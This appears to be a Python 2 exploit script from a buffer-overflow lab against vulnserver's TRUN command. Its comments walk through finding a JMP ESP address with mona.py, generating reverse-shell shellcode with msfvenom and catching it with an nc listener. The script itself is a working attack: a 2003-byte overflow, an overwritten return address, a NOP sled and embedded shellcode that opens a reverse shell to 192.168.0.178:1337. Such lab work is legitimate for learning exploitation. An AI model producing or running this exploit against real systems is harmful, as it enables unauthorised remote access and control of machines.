#!/usr/bin/python
import sys, socket

# in ID we used mona.py to find a vulnerable module by entering !mona modules and looked for a module without protections
# In this case the module with lot of falses when it came to protections was essfucnc.dll
# We then used nasm in kali to find the hex code for JMP ESP FFE4, which when written in hex looks like \xFF\xE4
# We then used mona.py in ID to run the following !mona find -s "\xff\xe4" -m essfunc.dll
# -m = module which is the module found in line 4 that was attached to vulnserver that had no protections = essfunc.dll
# -s "\xff\xe4" is the adress FFE4 written as hex code (FFE4 generated by nasm for the JMP ESP)
# When you run line 6 it provides a list of return addresses, start at the top of that list
# After our As we are going to enter the addresses returned in the previous line in reverse in hex format e.g. 625011af = \xaf\x11\x50\x62


# This overflow was generated using msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.178 LPORT=1337 EXITFUNC=thread -f c -a x86 -b "\x00"
# Apparently EXITFUNC=thread makes it more s_string_variable
# -f = file type in this case C
# -a = architecture in this case x86
# -b = bad characters not to be used in the overflow code = in this case"\x00" is the null byte

# Open tmux havve two panes one with a listener one running the exploit.
# nc -nvlp 1337 - the 1337 is the port designated
# experimented by changing port to 1337




overflow = ("\xdb\xdb\xbb\xc8\xfe\x17\x37\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x5a\x17\x83\xc2\x04\x03\x92\xed\xf5\xc2\xde\xfa\x78"
"\x2c\x1e\xfb\x1c\xa4\xfb\xca\x1c\xd2\x88\x7d\xad\x90\xdc\x71"
"\x46\xf4\xf4\x02\x2a\xd1\xfb\xa3\x81\x07\x32\x33\xb9\x74\x55"
"\xb7\xc0\xa8\xb5\x86\x0a\xbd\xb4\xcf\x77\x4c\xe4\x98\xfc\xe3"
"\x18\xac\x49\x38\x93\xfe\x5c\x38\x40\xb6\x5f\x69\xd7\xcc\x39"
"\xa9\xd6\x01\x32\xe0\xc0\x46\x7f\xba\x7b\xbc\x0b\x3d\xad\x8c"
"\xf4\x92\x90\x20\x07\xea\xd5\x87\xf8\x99\x2f\xf4\x85\x99\xf4"
"\x86\x51\x2f\xee\x21\x11\x97\xca\xd0\xf6\x4e\x99\xdf\xb3\x05"
"\xc5\xc3\x42\xc9\x7e\xff\xcf\xec\x50\x89\x94\xca\x74\xd1\x4f"
"\x72\x2d\xbf\x3e\x8b\x2d\x60\x9e\x29\x26\x8d\xcb\x43\x65\xda"
"\x38\x6e\x95\x1a\x57\xf9\xe6\x28\xf8\x51\x60\x01\x71\x7c\x77"
"\x66\xa8\x38\xe7\x99\x53\x39\x2e\x5e\x07\x69\x58\x77\x28\xe2"
"\x98\x78\xfd\xa5\xc8\xd6\xae\x05\xb8\x96\x1e\xee\xd2\x18\x40"
"\x0e\xdd\xf2\xe9\xa5\x24\x95\xd5\x92\x26\xd7\xbe\xe0\x26\x12"
"\x06\x6c\xc0\x76\x68\x38\x5b\xef\x11\x61\x17\x8e\xde\xbf\x52"
"\x90\x55\x4c\xa3\x5f\x9e\x39\xb7\x08\x6e\x74\xe5\x9f\x71\xa2"
"\x81\x7c\xe3\x29\x51\x0a\x18\xe6\x06\x5b\xee\xff\xc2\x71\x49"
"\x56\xf0\x8b\x0f\x91\xb0\x57\xec\x1c\x39\x15\x48\x3b\x29\xe3"
"\x51\x07\x1d\xbb\x07\xd1\xcb\x7d\xfe\x93\xa5\xd7\xad\x7d\x21"
"\xa1\x9d\xbd\x37\xae\xcb\x4b\xd7\x1f\xa2\x0d\xe8\x90\x22\x9a"
"\x91\xcc\xd2\x65\x48\x55\xf2\x87\x58\xa0\x9b\x11\x09\x09\xc6"
"\xa1\xe4\x4e\xff\x21\x0c\x2f\x04\x39\x65\x2a\x40\xfd\x96\x46"
"\xd9\x68\x98\xf5\xda\xb8")

# In the following we are filling the memory available with As, hitting the EIP represented by the address "\xaf\x11\x50\x62"
# We are then adding a little bit of padding using nop sleds which is essentially a little bit of padding before the exploit code actually runs.


shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.143',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:
    print "Error connecting to server"
    sys.exit()
